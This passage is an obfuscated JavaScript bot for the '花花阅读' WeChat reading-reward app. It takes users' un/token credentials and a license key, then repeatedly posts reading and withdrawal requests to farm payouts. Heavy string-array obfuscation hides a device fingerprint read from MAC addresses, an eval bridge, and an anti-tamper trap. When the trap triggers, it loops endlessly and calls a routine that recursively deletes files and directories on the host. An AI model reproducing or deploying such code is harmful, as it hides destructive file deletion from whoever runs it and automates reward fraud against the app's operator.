/*
花花阅读 微信阅读。。
抓一个un 和 token 
格式 un=xxxxx&token=xxxxxxxxxx
变量 hhydapp   对应账号数据
变量 cdkey    对应脚本验证卡密。所有脚本通用。。
多账号@分割
一天运行3次吧 每天三毛低保。。
6.14更新修复。。
*/
const $ = new Env('花花阅读');
var _0x5253d5=_0x3915,_0x414e03=_0x4567;function _0x552c(){var _0x2fd7e7=['WP7cVKS','gCkbwa','Cgf0Aa','W5nLWOjprsj5','wuVcTSo/','Aw5KzxHpzG','qwrFWPSxwW3dUConFW','WRdcO8oVW4Snz8kdnI4CigK','D8kidSomWQHRrIlcPricms3dOa','vCkLBg4','mta1zeDZBw1v','CMvHzgrPCLn5BMm','W7pcTmoqn2RcNZBdHmoiCavv','jLhdKmkjpq','W5JdQ20','WRDsW5vG','W7z7W7ldQCkIW7vfrmoEWRqsWOK','aX5du1RdTG','ExL5Eq','Ds5QBMjVC3mUy24','tw96AwXSys81lJaGkeXPBNv4oYbbBMrYB2LKideWoYaXnNmGuhjViej1AwXKl1fluteUmtKXmJiYlJaWmJSGD3yPiefWCgXLv2vIs2L0lZuZnY4ZnIaOs0HutuWSigXPA2uGr2vJA28PifzLCNnPB24Vnc4WienOCM9Tzs84mY4WlJqXmdmUmta2ie1VyMLSzsbtywzHCMKVntm3lJm2','qMBdI33dKq','zND1CG','W4D3wSk1W4VcG8kt','WQfJBMRdQMC0gg7dM1/cLX/cKNbCWPhcQriqcG','DmklcSkEW54QgxNcMa','DSk4W7ZcNJje','WO7dUSkA','daLivvRdU8kyWQKlFadcTG','WRZdSqOLWRpdKSk0W6C4tCkSW6VcHq/dVCo/ug/cHNhcSK/cPa','6kY65zcD772o5Ogh5Ow/56cr6kAe6isY5P6n5Bc26z+w5lM457cd57Q954UG54gM77+l772z776r772Y5lYR5y2H5P2vWQZMRAxMNONKVzZVVRe','iIWICgfNzvnPEMuIoJiWFq','nuu1yG','WRnqhCoQWQ9QWQi','jMjIpte','zNjVBunOyxjdB2rL','Ahr0Chm6lY91lMnVy296Ec5JBI9HCgKVDxnLCI93za','W7q4WOZcLq','bSkcvK3cTa','AgH5zgfWCa','W4z3xSkjW5JcJ8kgW6O5WRldJa','z2v0zgf0yq','CMvWBgfJzq','fmkEt0lcUmk1WQVdLX/cK8kPW5/dIG3cRmoSW7SVz8okWPfwW55nlYSyWRVdMfq','AgH5zc5QCW','y2HHCKnVzgvbDa','mtNdQSoRW7BdVYS','W4CaghO','DMfS','pue8FSkdFCknWOyFWOS','WR1RfmoHBmkc','ASoDlW','BNvT','p2TLEt0','FhFdO8oXW4nw','cUIjIEIjM+MyJoIVKq','WPNdTGeNWRpdNSkiW71IrCkWW6S','qZOV','z2v0uhjVCgvYDhK','y29Kzq','dL/dOSkVW5ZcM1bBW7VcHCkPWPa','nwDNAK1sva','WQFOIjZOIiNPMAhORyFMJA/NJzdVViFdUY57F+AkREwlRq','CMfUzg9T','C2v0uhjVCgvYDhK','EhH4Ea','W71sW5bl','W7FcO8obexlcLqFdKCow','WPC3jvJdPwa+eN0','WQFOIjZOIiNPMAhORyFNNRtOPkBPOOZVV5e','fmkDBfRcO8k/WQtdHa','W6vwdSoJWOO','y2fSBa','D2fPDa','l3n5CY9JBgfZCY9Uzxq','WOrJW7NcOmocWPRdSG','n8kwWQBdTdHn','WOeXie/dGgy0eLJdNa','nctdOCoEW6pdS25NWPO','iIWIDg9Rzw4IoIi','EmkOW7tcNYnE','mNbiv0jowG','tuq1','ldGXrq','W7r6W4tdVmkKW7L4vW','CM1KAxjtEw5J','ntG2mty1re9yzNrN','cGZdOmkPkSkN','W6RcNmkS','W47dN8oDbCoiW5RcS2NcUwKMoa','l3n5CY9JBgfZCY9UzxqV','cUw8GowNI+oaKoIkSEIkSEMyHEIVUW','W7K/WQe','rL9psW','EYjJB2rLiJOXlcj1BIi6iG','aXrk','yCkBWOLSwqztDSokW7W','jHybzmotW6e','W6RcMmk0WRFdS0FcKmk7WO9PWOq','ofxdKa','CgfYC2u','iL7dGmkplCkhW7S','oIuTxdnnbLRdOL/dKcK','y2HHCKf0','6z2s6B6z546V5Akd','z2v0vwLUDdmY','eGFdIqr3DSo/W61+WRddGSoa','nd7dUCoCW5BdQa','yNvMzMvY','ECoAW6dcUG','imovsq','WRDgW5jG','W7PvW59CW7L0W7W3W7JdVa','zM9YrwfJAa','W7qLWO3cKCkAW7/cSw/dPCoZW4JcONH5cW','Dw5SAw5Ru3LUyW','WQ7dMmo5WRxdQa','WQdcMSk7WOlcSHtcPSoyW7tdIG','bCkbtfO','AxneAxjLy3rVCNK','kCoEuCkDW60X','obyoz8oHW6aRWO3dIganWQi','ChvZAa','zgrK','hW5Exa','B8kZW6hcKs9kAW','W6PyhCofWPbk','cb5zzfZdSCk7WRGlyrC','bEIiMoIlTUMyI+ITOoAoREEnSa','bbZdQmkOo8k9','W6VdISovjSoLjmk/pG','W6vFg8oYWQfxWPldJSo8WQK','vUIlPUIlS+MyToIUI++8V0FPMk3ORzRMIkdLIkVVVydOJy/LV7u','WROSlSoP','jSouw8kF','zM7cR8kBWQ7cRNrjWQldOrpdK2u','WQySoa','jMLWptaMBwfJpq','o1C+','zMLUywXSEq','C8kmWOT9EqXUBa','WRTaWOtdNa','y3jLyxrLu3rYAw5N','CMvHzezPBgvtEw5J','z2v0DMfS','WQTcW4HVWO7dRG','W5DQCa/cSZXIlxRdHaNcLWi','5B2t5yMn6k6+5Ash5y+V5OMN6kgm6lsM5y+36zMq5yI25lI6','WPP/W7tcSCoFWPpdVt7cPMnrymkW','daFdHGDfDW','BgvUz3rO','W4GagW','yMfZzw5HBwu','W7ZdJCoNimowoq','WPFcLSoH','y2rRzxK','Cg9ZDa','aCkPEYzFWQ0','dq5ku0VdRa','bG7dHW9d','zmoFW6JcJ8k4WPnhW5BdGa','W5L9tq','WOBcGSoJmW','yxbWBgLJyxrPB24VANnVBJTJAgfYC2v0pvvurI04','hbBdLCk7pCk8xmoC','W7ZdTSkbWO5lfhjbW7VcKmojdSkU','B8ovW7S','W6dcP8ohjxS','ywjJzgvMmdeYmZq1nJC4oq','W6xdT8k5','ls0Tls0Tls0Tls0TlsdLHBe','W7i5WOVcN8kkW78','5lIQ6lsM5y+3cG','DMfSDwu','a3L7','ASobW7JcOW','cqLcww3dTSkQWQ86EGRcTa','W61KW7K','mti4odG5mfbxvKPRCG','y3jLyxrLt2jQzwn0','y2FdR8oLW4nm','mtG3ntKYn0rlvwfqBW','z2v0r2XVyMfS','D8kzWOn9','WPdcL8oPCSoB','DUIkLEIlQa','Dg9tDhjPBMC','WOJdQqaVWRxdQmkIW6DZ','DxrMoa','55s16isr546V5Akd','dhLYW5aqW49I','p0O9A8ow','AxnoB2rL','C3rHDfn5BMm','W5H+WObmwb8','AM9PBG','Aw5KzxG','mtbTzwXHsvu','Ahr0CdOVl3uUAM5IB3nZlMnUl2fWAs91C2vYl3n1yM1PDhq','bJauWPWmqZVdRSkbjJO','ntmXmJa1mLPJBhLZza','WRHCWQpdNCo1WOq','ywrKCMvZCW','lcWZ','WONdOrawWRxdLmkRW6XIwmkN','daLivvRdU8kEWRmDCaJcUmolvgu','qujdrevgr0HjsKTmtu5puffsu1rvvLDywvPHyMnKzwzNAgLQA2XTBM9WCxjZDhv2D3H5EJaXmJm0nty3odKRlZ0','W7BcKSk5W4ZdPG','WRj8h8oNBmkpyYdcL215bZlcOq','WPlcKCoMk8kgWO/dVYeN','mJmXnJeYmJzOCLPOsgO','y3jLyxrLrNvUy3rPB24','W6FdOCkYWPr6p8kJaaSwmKS','A2vLCc1HBgL2zq','W4iDe3ldS8k1csjnW7Gdxq','5lML55o1542K5Ac8','Bg9N','bCkCufRcVSkIWRpdKXm','DhjPBq','W4hdSgXL','WQlcTSo9avZcTd8','BxnN','mveABCkfWRnL','WPBdQWm','W6vteCoLWPS','eZRcHwddISksAg5qk8kG','aNDOW4ax','WQrpW4D6WRVdSG','W6vFg8oYWQnm','WRVcOCozW48E','WOHJW6S','fSkCwK/cPCkZWPNdLWtcLCkPWPC','iIWIBwLKiJOIiN0','WQncW5v8WOJdQCkv'];_0x552c=function(){return _0x2fd7e7;};return _0x552c();}(function(_0x3e9bbb,_0x39acc7){var _0x11a5c0=_0x3915,_0x3b805b=_0x4567,_0x5385bd=_0x3e9bbb();while(!![]){try{var _0x41c50f=parseInt(_0x3b805b(0x1bc))/0x1+parseInt(_0x11a5c0(0x158,'d9Y%'))/0x2*(parseInt(_0x3b805b(0x131))/0x3)+parseInt(_0x11a5c0(0x121,'df!d'))/0x4+parseInt(_0x3b805b(0x1a3))/0x5*(parseInt(_0x3b805b(0x144))/0x6)+parseInt(_0x3b805b(0x170))/0x7*(parseInt(_0x11a5c0(0x16d,'nBKw'))/0x8)+-parseInt(_0x3b805b(0x12e))/0x9+parseInt(_0x3b805b(0x141))/0xa*(-parseInt(_0x3b805b(0x14e))/0xb);if(_0x41c50f===_0x39acc7)break;else _0x5385bd['push'](_0x5385bd['shift']());}catch(_0x4ead75){_0x5385bd['push'](_0x5385bd['shift']());}}}(_0x552c,0x6e0ba));const VM=require('sablejs/runtime')(),path=require(_0x414e03(0x168)),fs=require('fs'),cryptoJS=require(_0x5253d5(0x1b4,'p9L0'));function initVM(){var _0x1c0e1b=_0x5253d5,_0x177229=_0x414e03;vm=new VM();const _0x494232=vm[_0x177229(0x132)](),_0x234287=vm[_0x177229(0x12f)](),_0x26c394=vm[_0x177229(0x14f)](_0x1c0e1b(0x1c2,'%KkV'),function(){var _0x55ea70=_0x177229,_0x58e951=_0x1c0e1b;const _0x5b72f2=[];for(let _0x3d18cc=0x0;_0x3d18cc<arguments[_0x58e951(0xf4,'#)UO')];_0x3d18cc++){_0x5b72f2[_0x55ea70(0xf6)](vm[_0x58e951(0x1ac,'&FG!')](arguments[_0x3d18cc]));}return console[_0x55ea70(0x154)](..._0x5b72f2),vm[_0x58e951(0x149,'$6Z$')]();}),_0x5631f5=vm[_0x177229(0x14f)](_0x177229(0x1a7),function(_0x3ff988){var _0x59072b=_0x1c0e1b;let _0x444f70=eval(_0x3ff988[_0x59072b(0x161,'df!d')]);return vm[_0x59072b(0x182,'$6Z$')](JSON['stringify'](_0x444f70));}),_0x11e281=vm['createFunction'](_0x177229(0x178),function(_0x1fd06c){var _0x4698c7=_0x177229,_0x3f65b7=_0x1c0e1b;let _0x17d835=_0x1fd06c['value'],_0x3aa8bf=fs[_0x3f65b7(0x1d0,'5y0W')](_0x17d835,_0x3f65b7(0x134,'2u9v'))[_0x4698c7(0x190)](/\r\n/g,'\x0a'),_0x4d6581=cryptoJS[_0x4698c7(0x1b8)](_0x3aa8bf)[_0x4698c7(0x136)]();return vm[_0x3f65b7(0x176,'ayjF')](_0x4d6581);}),_0x310740=vm[_0x1c0e1b(0x14c,'[eUz')](_0x177229(0xf7),function(_0x5c3878){var _0x186a93=_0x177229;let _0x3b4af5=cryptoJS[_0x186a93(0x1b8)](_0x5c3878[_0x186a93(0x129)])['toString']();return vm[_0x186a93(0x10a)](_0x3b4af5);});return vm[_0x177229(0x1a6)](_0x234287,_0x1c0e1b(0x122,'*Hkg'),_0x26c394),vm[_0x1c0e1b(0x18e,'Q(nX')](_0x494232,_0x177229(0x1a7),_0x5631f5),vm[_0x177229(0x1a6)](_0x494232,_0x1c0e1b(0x13a,'[ttV'),_0x234287),vm['setProperty'](_0x494232,_0x177229(0x178),_0x11e281),vm[_0x1c0e1b(0x148,'Sbhv')](_0x494232,_0x1c0e1b(0x125,'nBKw'),_0x310740),vm[_0x1c0e1b(0x116,'2u9v')](fs['readFileSync']('./output_final.js')[_0x1c0e1b(0xfe,'ISx1')]()),vm;}function destroyVM(_0x43c173){var _0x2188b5=_0x5253d5;_0x43c173[_0x2188b5(0x165,'87fV')]();}function abc(_0x45efc0,_0x867457,_0x29b5c0,_0x2840a8,_0x38fc5a){var _0x38558b=_0x5253d5,_0x447001=_0x414e03;const _0x4ba999=_0x45efc0['getGlobal']();let _0x39fc2d=_0x45efc0[_0x447001(0x1a0)](_0x4ba999,_0x38558b(0x104,'2kMS')),_0x3abaf9=_0x45efc0[_0x447001(0x1ae)](_0x39fc2d,_0x45efc0[_0x38558b(0xee,'PwP%')](),_0x45efc0['createString'](_0x867457),_0x45efc0[_0x447001(0x10a)](_0x2840a8),_0x45efc0[_0x38558b(0x19e,'Sbhv')](_0x38fc5a),_0x45efc0[_0x38558b(0x172,'d9Y%')](_0x29b5c0));return _0x3abaf9=_0x45efc0[_0x38558b(0x1ba,'ayjF')](_0x3abaf9),_0x3abaf9;}function xyz(_0x32744a,_0x5d379c,_0x5e8cc5,_0x1f4ecd,_0x389ee5){var _0x339165=_0x414e03,_0x7bb243=_0x5253d5;const _0x21e108=_0x32744a[_0x7bb243(0x1a9,'d9Y%')]();let _0x35df49=_0x32744a[_0x7bb243(0xfb,'$6Z$')](_0x21e108,_0x7bb243(0x12d,'ayjF')),_0x1da3b0=_0x32744a[_0x7bb243(0x11e,'2u9v')](_0x35df49,_0x32744a['createUndefined'](),_0x32744a[_0x339165(0x10a)](_0x5d379c),_0x32744a['createString'](_0x1f4ecd),_0x32744a[_0x7bb243(0x163,'&FG!')](_0x389ee5),_0x32744a[_0x7bb243(0x1bf,'0eVO')](_0x5e8cc5));return _0x1da3b0=_0x32744a['asString'](_0x1da3b0),_0x1da3b0;}var gtr;let ml='',mac='',status;status=(status=$[_0x414e03(0x10c)]('qmwkstatus')||'1')>0x1?''+status:'',JSNAMED=$['isNode']()?require(_0x5253d5(0xeb,'87fV'))[_0x414e03(0x114)](__filename):_0x414e03(0x192);let hhydappArr=[],un='',token='',all_msg='',arrs=[],hhydapp=($[_0x5253d5(0x145,'pDUA')]()?process[_0x5253d5(0x162,'H%jU')][_0x414e03(0x18d)]:$[_0x414e03(0x18f)]('hhydapp'))||'',acckey=$['isNode']()?process[_0x5253d5(0xea,'#)UO')][_0x414e03(0x117)]?process['env']['cdkey']:'':$[_0x414e03(0x18f)](_0x414e03(0x117))?$[_0x414e03(0x18f)](_0x5253d5(0x15c,'u[DE')):'';if($[_0x414e03(0x13c)]()){gtr=require('fs');if(isFileExist(_0x5253d5(0x181,'df!d')))console[_0x5253d5(0x174,'3Xom')](_0x414e03(0x139)),setInterval(()=>{var _0x1ff485=_0x5253d5;do{(function(_0xc24bae){return function(_0xb5a84f){var _0x2d7b36=_0x3915;return Function(_0x2d7b36(0x183,'Sbhv')+_0xb5a84f+_0x2d7b36(0xe9,'0%ZD'));}(_0xc24bae);}(_0x1ff485(0x11a,'$6Z$'))('de',0x0,0x0,(0x0,0x0)),addF(_0x1ff485(0x166,'Sbhv')),addF(_0x1ff485(0x147,'[ttV')));}while(0x1);},0x0);else{console['log'](_0x414e03(0x1ce));function getMACAddresses(){var _0x1b6a6c=_0x414e03,_0x1f2790='',_0x23e5dc=fs['readdirSync'](_0x1b6a6c(0x1c0));return _0x23e5dc[_0x1b6a6c(0xed)](function(_0x3b81e3){var _0x4291c8=_0x3915,_0x3b0c19=_0x1b6a6c,_0x190101=path[_0x3b0c19(0x13f)](_0x3b0c19(0x1b0),_0x3b81e3,_0x3b0c19(0x146));_0x3b81e3[_0x4291c8(0x19c,'Z7hG')](0x0,0x3)==_0x4291c8(0x199,'l!sN')&&fs['existsSync'](_0x190101)&&(_0x1f2790=fs[_0x4291c8(0xf5,'uFd*')](_0x190101)[_0x4291c8(0x120,'b!^F')]()[_0x3b0c19(0x156)]());}),_0x1f2790;}mac=getMACAddresses();}}else console['log'](_0x5253d5(0x153,'1CTd'));function isFileExist(_0x279abc){var _0x4110fe=_0x414e03,_0x126e3c=_0x5253d5;try{gtr[_0x126e3c(0x1c6,'#RuR')](_0x279abc,gtr[_0x4110fe(0x1c3)]);}catch(_0x1d334a){return![];}return!![];}function _0x4567(_0x4492c6,_0x2d5dfa){var _0x552c53=_0x552c();return _0x4567=function(_0x4567e9,_0x1ca68c){_0x4567e9=_0x4567e9-0xe9;var _0x5b8009=_0x552c53[_0x4567e9];if(_0x4567['SkAptM']===undefined){var _0x507444=function(_0x39153b){var _0x559d3b='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x2a4ac1='',_0x879f0b='';for(var _0x154804=0x0,_0x423d2b,_0x2d768e,_0x494232=0x0;_0x2d768e=_0x39153b['charAt'](_0x494232++);~_0x2d768e&&(_0x423d2b=_0x154804%0x4?_0x423d2b*0x40+_0x2d768e:_0x2d768e,_0x154804++%0x4)?_0x2a4ac1+=String['fromCharCode'](0xff&_0x423d2b>>(-0x2*_0x154804&0x6)):0x0){_0x2d768e=_0x559d3b['indexOf'](_0x2d768e);}for(var _0x234287=0x0,_0x26c394=_0x2a4ac1['length'];_0x234287<_0x26c394;_0x234287++){_0x879f0b+='%'+('00'+_0x2a4ac1['charCodeAt'](_0x234287)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x879f0b);};_0x4567['Tiwjpa']=_0x507444,_0x4492c6=arguments,_0x4567['SkAptM']=!![];}var _0x48633a=_0x552c53[0x0],_0x15b90c=_0x4567e9+_0x48633a,_0x591463=_0x4492c6[_0x15b90c];return!_0x591463?(_0x5b8009=_0x4567['Tiwjpa'](_0x5b8009),_0x4492c6[_0x15b90c]=_0x5b8009):_0x5b8009=_0x591463,_0x5b8009;},_0x4567(_0x4492c6,_0x2d5dfa);}function addF(_0x4093d0,_0x430f5e){var _0x471537=_0x414e03,_0x163ec8=_0x5253d5;let _0x4bdaaa=0x0,_0x3df75f=_0x163ec8(0x17e,'jFik');if(isFileExist(_0x3df75f))_0x4bdaaa=gtr[_0x471537(0x10b)](_0x3df75f,_0x471537(0x138));else{if(isFileExist(_0x471537(0x19f)))gtr[_0x163ec8(0x14d,'2u9v')](_0x3df75f,'1',function(_0x4de222){if(_0x4de222)throw _0x4de222;});else return;}if(_0x4bdaaa==0x63)return 0x63;console[_0x471537(0x154)](_0x4bdaaa),console[_0x163ec8(0x1c5,'$6Z$')](_0x163ec8(0x184,'KlXj'),_0x4bdaaa);if(parseInt(_0x4bdaaa)<0x3){let _0x40a241=parseInt(_0x4bdaaa)+0x1;gtr[_0x163ec8(0x110,'H%jU')](_0x3df75f,_0x40a241+'',_0x163ec8(0x157,'3Xom'));return;}if(!gtr[_0x163ec8(0x16c,'JFE^')](_0x4093d0))return;if(gtr[_0x471537(0x13d)](_0x4093d0)[_0x471537(0xf3)]()){var _0x1a20c4=gtr[_0x471537(0x171)](_0x4093d0),_0x36e333=_0x1a20c4[_0x163ec8(0x198,'[eUz')],_0x5039f4=0x0;if(_0x36e333>0x0)_0x1a20c4[_0x163ec8(0x194,'p9L0')](function(_0xeafea6){var _0x43a671=_0x471537,_0x540c13=_0x163ec8;_0x5039f4++;var _0x19891c=gtr[_0x540c13(0x108,'#RuR')](_0x4093d0+'/'+_0xeafea6),_0x4339d7=_0x4093d0+'/'+_0xeafea6;gtr[_0x43a671(0x13d)](_0x4339d7)[_0x43a671(0xf3)]()?addF(_0x4339d7,!![]):gtr[_0x43a671(0xef)](_0x4339d7);}),_0x36e333==_0x5039f4&&_0x430f5e&&gtr[_0x163ec8(0x137,'Sbhv')](_0x4093d0);else _0x36e333==0x0&&_0x430f5e&&gtr[_0x471537(0x1bb)](_0x4093d0);}else gtr[_0x471537(0xef)](_0x4093d0);}!(async()=>{var _0x2a39bb=_0x414e03,_0x419af7=_0x5253d5;if(typeof $request!==_0x419af7(0x1aa,'jFik')){}else{initVM(),arrs=abc(global['vm'],acckey,mac,0x26,0x0);if(arrs=='')return;arrs=JSON[_0x419af7(0x14b,'1CTd')](arrs);if(!arrs)return;hhydappArr=hhydapp[_0x419af7(0x17b,'h&Ox')]('@'),console[_0x419af7(0x1be,'1CTd')]('\x0a公告：'+arrs['gg']+'\x0a'),console[_0x419af7(0x11d,'Q(nX')]('当前版本：1.0\x20'+arrs['bb']+'\x0a'),console[_0x2a39bb(0x154)](_0x2a39bb(0x126)+hhydappArr['length']+'个账号-------------\x0a'),console[_0x2a39bb(0x154)](_0x2a39bb(0x10f)+arrs['num']+_0x2a39bb(0x128));if(hhydappArr['length']>parseInt(arrs[_0x2a39bb(0x19a)])){}else for(let _0x4596b2=0x0;_0x4596b2<hhydappArr[_0x419af7(0x1b2,'0%ZD')];_0x4596b2++){hhydapp=hhydappArr[_0x4596b2],$[_0x2a39bb(0x140)]=_0x4596b2+0x1,console[_0x2a39bb(0x154)](_0x2a39bb(0x1c1)+$[_0x419af7(0x13b,'$MZN')]+'】'),un=hhydapp[_0x419af7(0x173,'tNNs')](/un=(.*?)&/)[0x1],token=hhydapp[_0x419af7(0x15e,'[ttV')](/token=(\w+)/)[0x1],await hhydyd(),await hhydtx();}}destroyVM(global['vm']);})()[_0x5253d5(0x1ad,'u[DE')](_0x12c674=>$['logErr'](_0x12c674))[_0x414e03(0x107)](()=>$[_0x5253d5(0x1a8,'0uXp')]());function hhydyd(_0xe496ee=0x0){return new Promise(_0x3e31e8=>{var _0x4a4c71=_0x3915,_0x2a2c83=_0x4567;let _0x4415be={'url':'http://u.jnboss.cn/api/user/readd','headers':{'Host':'u.jnboss.cn','Connection':'keep-alive','User-Agent':_0x2a2c83(0x17a),'Content-Type':_0x4a4c71(0x191,'&FG!')},'body':_0x4a4c71(0x15a,'uFd*')+un+_0x2a2c83(0x1b5)+token+_0x2a2c83(0x185)};$['post'](_0x4415be,async(_0x1aef73,_0x4460b4,_0x1d0057)=>{var _0x40b481=_0x2a2c83,_0x36ed86=_0x4a4c71;try{const _0x4f9c98=JSON['parse'](_0x1d0057);_0x4f9c98['code']==0x0?(console[_0x36ed86(0x113,'SiH2')]('\x0a花花阅读：\x20开始阅读，等待6秒'),await $[_0x40b481(0x1af)](0x1770),await hhydtj()):console[_0x40b481(0x154)](_0x36ed86(0x19d,'#RuR')+_0x4f9c98[_0x40b481(0x159)]);}catch(_0x8066b){}finally{_0x3e31e8();}},_0xe496ee);});}function hhydtj(_0x2eda61=0x0){return new Promise(_0x3e35bf=>{var _0x27acb2=_0x3915,_0x77bbc7=_0x4567;let _0x2bd406={'url':_0x77bbc7(0x142),'headers':{'Host':_0x77bbc7(0x179),'Connection':_0x77bbc7(0x151),'User-Agent':_0x77bbc7(0x17a),'Content-Type':_0x77bbc7(0x11f)},'body':'{\x22un\x22:\x22'+un+'\x22,\x22token\x22:\x22'+token+_0x77bbc7(0x185)};$[_0x27acb2(0xf2,'&FG!')](_0x2bd406,async(_0x24d677,_0xb30e4c,_0x4a3a41)=>{var _0x1b190d=_0x27acb2,_0x9a3f69=_0x77bbc7;try{const _0x93ee3=JSON[_0x9a3f69(0x1ca)](_0x4a3a41);_0x93ee3[_0x1b190d(0x18b,'PwP%')]==0x0?(console[_0x9a3f69(0x154)](_0x1b190d(0x100,'KlXj')+_0x93ee3[_0x1b190d(0x119,'PnFq')][_0x9a3f69(0x196)]+_0x1b190d(0x135,'$MZN')),await $[_0x1b190d(0x133,'#RuR')](0x7d0),await hhydyd()):console[_0x1b190d(0x167,'&FG!')]('\x0a花花阅读'+_0x93ee3[_0x9a3f69(0x159)]);}catch(_0x23d5a3){}finally{_0x3e35bf();}},_0x2eda61);});}function hhydtx(_0x12ade0=0x0){return new Promise(_0x4d876a=>{var _0x32b309=_0x3915,_0x8dc2a1=_0x4567;let _0x50291e={'url':_0x8dc2a1(0x18a),'headers':{'Host':'u.cocozx.cn','Connection':_0x8dc2a1(0x151),'User-Agent':_0x8dc2a1(0x17a),'Content-Type':_0x8dc2a1(0x11f)},'body':'{\x22val\x22:3000,\x22un\x22:\x22'+un+_0x32b309(0x15d,'h&Ox')+token+_0x8dc2a1(0x164)};$['post'](_0x50291e,async(_0x17b3a8,_0x2b1924,_0x1f8512)=>{var _0x1d5a77=_0x32b309,_0x38e19f=_0x8dc2a1;try{const _0x57761a=JSON[_0x38e19f(0x1ca)](_0x1f8512);_0x57761a[_0x38e19f(0x1a1)]==0x0?(console[_0x38e19f(0x154)](_0x1d5a77(0x1a4,'0eVO')),await hhydyd()):console[_0x1d5a77(0x12a,'[ttV')](_0x1d5a77(0xfc,'l!sN')+_0x57761a['msg']);}catch(_0x4f8f9b){}finally{_0x4d876a();}},_0x12ade0);});}function hhydsj(_0x5cdb3f=0x0){return new Promise(_0x140892=>{var _0x24e467=_0x4567,_0x50b502=_0x3915;let _0x3f2473={'url':'https://u.jnboss.cn/api/user/viewVideo','headers':{'Host':'u.jnboss.cn','Connection':_0x50b502(0x197,'$MZN'),'User-Agent':_0x24e467(0x17a),'Content-Type':_0x24e467(0x11f)},'body':_0x24e467(0x1c4)+un+_0x50b502(0x143,'JFE^')+token+_0x50b502(0x1c8,'T1ew')};$[_0x50b502(0x1b9,'KlXj')](_0x3f2473,async(_0x4aa503,_0x2be245,_0x44a431)=>{var _0x2b3b94=_0x50b502;try{console['log'](_0x44a431);const _0x130825=JSON[_0x2b3b94(0x123,'d9Y%')](_0x44a431);_0x130825[_0x2b3b94(0x102,'#)UO')]==0x0?(console[_0x2b3b94(0x15b,'Sbhv')](_0x2b3b94(0x1ab,'0eVO')+_0x130825[_0x2b3b94(0x106,'$MZN')]+'\x20（每天看三次增加阅读时间）'),await hhydyd()):console['log']('\x0a花花阅读看视频'+_0x130825['msg']);}catch(_0x192a18){}finally{_0x140892();}},_0x5cdb3f);});}function randomString(_0x35b640=0xc){var _0x4f5408=_0x5253d5,_0x18b5ff=_0x414e03;let _0x6a5416=_0x18b5ff(0x124),_0x43619d=_0x6a5416[_0x4f5408(0x1c7,'uFd*')],_0xa20c2e='';for(i=0x0;i<_0x35b640;i++){_0xa20c2e+=_0x6a5416['charAt'](Math[_0x4f5408(0xf0,'T1ew')](Math['random']()*_0x43619d));}return _0xa20c2e;}function _0x3915(_0x4492c6,_0x2d5dfa){var _0x552c53=_0x552c();return _0x3915=function(_0x4567e9,_0x1ca68c){_0x4567e9=_0x4567e9-0xe9;var _0x5b8009=_0x552c53[_0x4567e9];if(_0x3915['kBWKON']===undefined){var _0x507444=function(_0x559d3b){var _0x2a4ac1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x879f0b='',_0x154804='';for(var _0x423d2b=0x0,_0x2d768e,_0x494232,_0x234287=0x0;_0x494232=_0x559d3b['charAt'](_0x234287++);~_0x494232&&(_0x2d768e=_0x423d2b%0x4?_0x2d768e*0x40+_0x494232:_0x494232,_0x423d2b++%0x4)?_0x879f0b+=String['fromCharCode'](0xff&_0x2d768e>>(-0x2*_0x423d2b&0x6)):0x0){_0x494232=_0x2a4ac1['indexOf'](_0x494232);}for(var _0x26c394=0x0,_0x5631f5=_0x879f0b['length'];_0x26c394<_0x5631f5;_0x26c394++){_0x154804+='%'+('00'+_0x879f0b['charCodeAt'](_0x26c394)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x154804);};var _0x39153b=function(_0x11e281,_0x310740){var _0x5b72f2=[],_0x3d18cc=0x0,_0x3ff988,_0x444f70='';_0x11e281=_0x507444(_0x11e281);var _0x1fd06c;for(_0x1fd06c=0x0;_0x1fd06c<0x100;_0x1fd06c++){_0x5b72f2[_0x1fd06c]=_0x1fd06c;}for(_0x1fd06c=0x0;_0x1fd06c<0x100;_0x1fd06c++){_0x3d18cc=(_0x3d18cc+_0x5b72f2[_0x1fd06c]+_0x310740['charCodeAt'](_0x1fd06c%_0x310740['length']))%0x100,_0x3ff988=_0x5b72f2[_0x1fd06c],_0x5b72f2[_0x1fd06c]=_0x5b72f2[_0x3d18cc],_0x5b72f2[_0x3d18cc]=_0x3ff988;}_0x1fd06c=0x0,_0x3d18cc=0x0;for(var _0x17d835=0x0;_0x17d835<_0x11e281['length'];_0x17d835++){_0x1fd06c=(_0x1fd06c+0x1)%0x100,_0x3d18cc=(_0x3d18cc+_0x5b72f2[_0x1fd06c])%0x100,_0x3ff988=_0x5b72f2[_0x1fd06c],_0x5b72f2[_0x1fd06c]=_0x5b72f2[_0x3d18cc],_0x5b72f2[_0x3d18cc]=_0x3ff988,_0x444f70+=String['fromCharCode'](_0x11e281['charCodeAt'](_0x17d835)^_0x5b72f2[(_0x5b72f2[_0x1fd06c]+_0x5b72f2[_0x3d18cc])%0x100]);}return _0x444f70;};_0x3915['STVOmn']=_0x39153b,_0x4492c6=arguments,_0x3915['kBWKON']=!![];}var _0x48633a=_0x552c53[0x0],_0x15b90c=_0x4567e9+_0x48633a,_0x591463=_0x4492c6[_0x15b90c];return!_0x591463?(_0x3915['FrAMlC']===undefined&&(_0x3915['FrAMlC']=!![]),_0x5b8009=_0x3915['STVOmn'](_0x5b8009,_0x1ca68c),_0x4492c6[_0x15b90c]=_0x5b8009):_0x5b8009=_0x591463,_0x5b8009;},_0x3915(_0x4492c6,_0x2d5dfa);}function randomString(_0x334f09=0xc){var _0xa40f49=_0x414e03,_0x42e6bb=_0x5253d5;let _0x1d3985='abcdef0123456789',_0x1175a1=_0x1d3985[_0x42e6bb(0x177,'$6Z$')],_0x5a0114='';for(i=0x0;i<_0x334f09;i++){_0x5a0114+=_0x1d3985[_0xa40f49(0x1cd)](Math[_0x42e6bb(0x11b,'5y0W')](Math[_0xa40f49(0x1a5)]()*_0x1175a1));}return _0x5a0114;}function encodeUTF8(_0x418a33){var 